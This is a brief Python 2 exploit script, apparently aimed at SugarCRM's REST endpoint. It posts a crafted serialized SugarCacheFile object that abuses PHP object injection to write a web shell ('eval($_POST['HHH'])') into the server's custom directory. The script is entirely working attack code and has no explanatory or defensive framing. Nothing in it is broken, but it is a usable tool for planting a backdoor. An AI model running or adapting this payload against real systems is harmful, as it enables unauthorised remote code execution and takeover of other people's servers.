#!/usr/bin/env python
# encoding: utf-8
# encoding: utf-8

import requests as req
import os

os.system('clear')

url = 'http://192.168.1.104:8090/service/v4/rest.php'

upload_php = '/custom/daitao.php'

data = {  
    'method': 'login',
    'input_type': 'Serialize',
    # 'rest_data': 'O:+14:"SugarCacheFile":23:{S:17:"\\00*\\00_cacheFileName";s:15:"../1.php";S:16:"\\00*\\00_cacheChanged";b:1;S:14:"\\00*\\00_localStore";a:1:{i:0;s:29:"<?php eval($_POST[\'HHH\']); ?>";}}',
    'rest_data': 'O:+14:"SugarCacheFile":23:{S:17:"\\00*\\00_cacheFileName";s:%d:"..%s";S:16:"\\00*\\00_cacheChanged";b:1;S:14:"\\00*\\00_localStore";a:1:{i:0;s:29:"<?php eval($_POST[\'HHH\']); ?>";}}' % (len(upload_php)+2, upload_php)
}

print data['rest_data']
raw_input('wait...')

res = req.post(url, data=data)
# res = req.get(url)
print res.status_code
print res.content
